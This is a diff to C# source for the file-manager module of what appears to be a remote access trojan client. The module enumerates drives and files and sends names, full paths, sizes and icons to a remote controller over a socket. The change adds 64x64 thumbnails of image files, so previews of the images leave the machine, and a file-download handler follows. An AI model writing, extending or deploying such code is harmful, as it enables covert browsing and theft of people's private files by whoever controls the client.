@@ -13,7 +13,6 @@ namespace Client.Handle_Packet
 {
     class FileManager
     {
-
         public void GetDrivers()
         {
             DriveInfo[] allDrives = DriveInfo.GetDrives();
@@ -46,18 +45,36 @@ namespace Client.Handle_Packet
             }
             foreach (string file in Directory.GetFiles(path))
             {
-                Icon icon = Icon.ExtractAssociatedIcon(file);
-                Bitmap bmpIcon = icon.ToBitmap();
-                long length = new FileInfo(file).Length;
                 using (MemoryStream ms = new MemoryStream())
                 {
-                    bmpIcon.Save(ms, ImageFormat.Png);
-                    sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>" + length.ToString() + "-=>");
+                    GetIcon(file).Save(ms, ImageFormat.Png);
+                    sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>" + new FileInfo(file).Length.ToString() + "-=>");
                 }
             }
             msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
             msgpack.ForcePathObject("File").AsString = sbFile.ToString();
             ClientSocket.BeginSend(msgpack.Encode2Bytes());
+        }
+
+        private Bitmap GetIcon(string file)
+        {
+            try
+            {
+                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") || file.EndsWith("bmp"))
+                {
+                    using (Image thumb = Image.FromFile(file).GetThumbnailImage(64, 64, () => false, IntPtr.Zero))
+                    {
+                        return new Bitmap(thumb);
+                    }
+                }
+                Icon icon = Icon.ExtractAssociatedIcon(file);
+                Bitmap bmpIcon = icon.ToBitmap();
+                return bmpIcon;
+            }
+            catch
+            {
+                return new Bitmap(64, 64);
+            }
         }
 
         public void DownnloadFile(string file, string dwid)
